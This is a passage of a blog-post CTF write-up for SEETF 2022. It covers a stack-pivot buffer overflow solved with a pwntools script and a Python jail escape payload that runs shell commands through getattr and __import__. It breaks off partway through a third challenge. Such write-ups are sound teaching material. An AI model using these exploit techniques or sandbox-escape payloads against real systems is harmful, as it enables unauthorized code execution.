<!DOCTYPE html>
<html lang="en-us">
  <head>
    <title>SEETF 2022 | Welcome to Chovid99&#39;s Blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta property="og:title" content="SEETF 2022" />
<meta property="og:description" content="Writeup for SEETF 2022 by Chovid99 and gmberlian" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/seetf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-06-06T21:50:32+07:00" />
<meta property="article:modified_time" content="2022-06-06T21:50:32+07:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>

<meta name="twitter:title" content="SEETF 2022"/>
<meta name="twitter:description" content="Writeup for SEETF 2022 by Chovid99 and gmberlian"/>
<meta name="twitter:site" content="@Chovid99"/>
<meta name="twitter:creator" content="@Chovid99"/>
<meta property="og:site_name" content="Chovid99's Blog">

<meta name="generator" content="Hugo 0.95.0" />


  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">


<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/tocbot.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />


  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-19HP521HQ9');
  </script>



  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>






  </head>

  <body>
    <nav class="navigation">
	
		<a href="/"> <span class="arrow">←</span>Home</a>
	
	<a href="/posts">Posts</a>
	<a href="/tags">Tags</a>
	<a href="/about">About</a>

	

	
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">SEETF 2022</h1>

    <div class="tip">
        <time datetime="2022-06-06 21:50:32 &#43;0700 WIB">Jun 6, 2022</time>
        <span class="split">
          ·
        </span>
        <span>
          5859 words
        </span>
        <span class="split">
          ·
        </span>
        <span>
          28 minute read
        </span>
    </div>

    <div class="content">
      <div class="post-content js-toc-content">
        <p><p class="markdown-image">
  <img src="https://i.imgur.com/OlrwWuM.png" alt=""  />
</p></p>
<p>During the weekend, I played this CTF with one of my school&rsquo;s friend. We managed to solve some problems, so we will try to write how we solved some of the challenge.</p>
<h1 id="pwn">Pwn <a href="#pwn" class="anchor">#</a></h1>
<p>We will explain our solution for some challenges that we solved in the pwn category.</p>
<h2 id="easy-overflow">Easy Overflow <a href="#easy-overflow" class="anchor">#</a></h2>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Author: Bob123
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I did a check on my return address. Now you shouldn&#39;t be able to control my RIP.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nc fun.chall.seetf.sg 50003
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h3>
<p>We were given a binary file, Let&rsquo;s try to disassemble it.</p>
<p><strong>main function</strong></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_28 [<span style="color:#f60">32</span>];
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  setbuf(stdout,(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>);
</span></span><span style="display:flex;"><span>  setbuf(stdin,(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;I will let you  overflow me.&#34;</span>);
</span></span><span style="display:flex;"><span>  vuln();
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;I will give you one more chance.&#34;</span>);
</span></span><span style="display:flex;"><span>  fgets(local_28,<span style="color:#f60">8</span>,stdin);
</span></span><span style="display:flex;"><span>  puts(local_28);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>vuln function</strong></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">vuln</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_stack_00000000;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_28 [<span style="color:#f60">32</span>];
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  gets(local_28);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (in_stack_00000000 <span style="color:#555">==</span> <span style="color:#f60">0x401212</span>) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Good  boi</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Naughty Boi</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>  exit(<span style="color:#555">-</span><span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>win function</strong></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">win</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  system(<span style="color:#c30">&#34;cat flag&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>  exit(<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that on <code>vuln</code> method, there is a buffer overflow bug, because it used <code>gets</code>. However, there is a check where the return address must be <code>0x401212</code>, which mean we aren&rsquo;t allowed to modify the return address of the <code>vuln</code> method. And then after the <code>vuln</code> method, we were given one more chance to send our input, which will be stored in <code>rbp-0x20</code>.</p>
<h3 id="exploitation-plan">Exploitation Plan <a href="#exploitation-plan" class="anchor">#</a></h3>
<p>We can&rsquo;t overwrite the return address, but we actually can overwrite the saved rbp, so that we can pivot the <code>main</code> function stack. The <code>checksec</code> result also indicate that we can do GOT overwrite.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, our plan is to pivot the <code>main</code> stack (overwrite saved <code>rbp</code>) to <code>GOT['puts']+0x20</code>, so that when we send our second input, it will overwrite it with the <code>win</code> function.</p>
<h3 id="solution">Solution <a href="#solution" class="anchor">#</a></h3>
<p>Below is our full solver</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#555">=</span> ELF(<span style="color:#c30">&#39;./easy_overflow&#39;</span>)
</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> remote(<span style="color:#c30">&#39;fun.chall.seetf.sg&#39;</span>, <span style="color:#f60">50003</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x20</span><span style="color:#555">+</span>p64(elf<span style="color:#555">.</span>got[<span style="color:#c30">&#39;puts&#39;</span>]<span style="color:#555">+</span><span style="color:#f60">0x20</span>)<span style="color:#555">+</span>p64(<span style="color:#f60">0x00000000401212</span>)
</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(payload)
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;overflow me.</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, payload)
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;more chance.</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, p64(elf<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;win&#39;</span>]))
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="result">Result <a href="#result" class="anchor">#</a></h4>
<p><p class="markdown-image">
  <img src="https://i.imgur.com/BksvQgy.png" alt=""  />
</p></p>
<blockquote>
<p>Flag: <code>SEE{R1P_15_K1NG_RBP_15_QU33N_31cfc2f963517cd7e1b33b84a0e6bea2}</code></p>
</blockquote>
<h2 id="as-df">&ldquo;as&rdquo; &ldquo;df&rdquo; <a href="#as-df" class="anchor">#</a></h2>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Author: TheMythologist
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Why use a python interpreter when there are online ones?
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nc fun.chall.seetf.sg 50002
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="solution-1">Solution <a href="#solution-1" class="anchor">#</a></h3>
<p>Let&rsquo;s try to connect to the server, and turn out it is a python jail challenge. We tried to <code>print(globals)</code>, and found out that there is the blacklist array
<p class="markdown-image">
  <img src="https://i.imgur.com/OFPIZSg.png" alt=""  />
</p></p>
<p>Notes that, <code>+</code> and whitespace is banned. The trick to bypass this is, we can actually concat a string without using <code>+</code>. Example: <code>'as''df'</code> will be concatted by python to <code>'asdf'</code>. To bypass the whitespace, we use <code>\x20</code>. And the full payload is below, where we use the help of <code>getattr</code> to import <code>os</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>print(getattr(getattr(globals()[&#39;__builtins__&#39;],&#39;__im&#39;&#39;port__&#39;)(&#39;o&#39;&#39;s&#39;),&#39;sys&#39;&#39;tem&#39;)(&#39;cat\x20/fl*&#39;))
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="result-1">Result <a href="#result-1" class="anchor">#</a></h4>
<p><p class="markdown-image">
  <img src="https://i.imgur.com/F8DxDLT.jpg" alt=""  />
</p></p>
<blockquote>
<p>Flag: <code>SEE{every_ctf_must_have_a_python_jail_challenge_836a4218fb09b4a0ab0412e64de74315}</code></p>
</blockquote>
<h2 id="hall-of-fame">Hall Of Fame <a href="#hall-of-fame" class="anchor">#</a></h2>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Author: @L0uisJ0shua
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>It’s about drive, it’s about power, we stay hungry, we devour Put in the work, put in the hours and take what’s ours. Time to get to the Hall of Fame and be among the GOATS.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nc fun.chall.seetf.sg 50004
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="initial-analysis-1">Initial Analysis <a href="#initial-analysis-1" class="anchor">#</a></h3>
<p>We were given a binary file and <code>libc-2.27.so</code>. Let&rsquo;s try to disassemble the binary file.</p>
<p><strong>main</strong></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
